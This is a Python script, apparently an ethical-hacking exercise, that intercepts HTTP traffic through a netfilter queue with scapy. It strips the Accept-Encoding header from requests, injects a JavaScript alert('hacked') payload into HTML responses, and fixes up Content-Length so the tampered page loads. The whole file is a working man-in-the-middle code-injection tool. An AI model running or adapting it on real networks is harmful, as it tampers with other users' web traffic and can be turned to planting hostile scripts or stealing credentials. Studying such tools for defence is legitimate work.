import netfilterqueue
import scapy.all as scapy
import chardet
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    # remove the len and chksum from the ip layer and the chksum from the TCP layer (scapy will calculate it automatically for us)
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def decode_bytes(bytes_to_decode):
    encoding_type = chardet.detect(bytes_to_decode)["encoding"]
    if encoding_type:
        try:
            return bytes_to_decode.decode(encoding_type)
        except:
            return False

    return False


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        decoded_load_str = decode_bytes(scapy_packet[scapy.Raw].load)

        if decoded_load_str:
            # if destination port == 80 (http port), it is a request
            if scapy_packet[scapy.TCP].dport == 80:
                print("[+] Request")

                # remove Accept-Encoding field
                decoded_load_str = re.sub(
                    "Accept-Encoding:.*?\\r\\n",
                    "",
                    decoded_load_str,
                )
                new_packet = set_load(scapy_packet, decoded_load_str)
                print(new_packet.show())
                packet.set_payload(new_packet.build())
                # packet.set_payload(bytes(new_packet))

            # if source port == 80 (http port), it is a response
            elif scapy_packet[scapy.TCP].sport == 80:
                print("[+] Response")

                if decoded_load_str.find("</body>") > -1:
                    injection_code = "<script>alert('hacked')</script>"

                    decoded_load_str = decoded_load_str.replace(
                        "</body>", injection_code + "</body>"
                    )

                    content_length_search = re.search(
                        "(?:Content-Length:\s)(\d*)", decoded_load_str
                    )

                    if content_length_search and "text/html" in decoded_load_str:
                        content_length = content_length_search.group(1)
                        new_content_length = int(content_length) + len(injection_code)

                        decoded_load_str = decoded_load_str.replace(
                            content_length, str(new_content_length)
                        )

                    new_packet = set_load(scapy_packet, decoded_load_str)
                    print(new_packet.show())
                    packet.set_payload(new_packet.build())

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
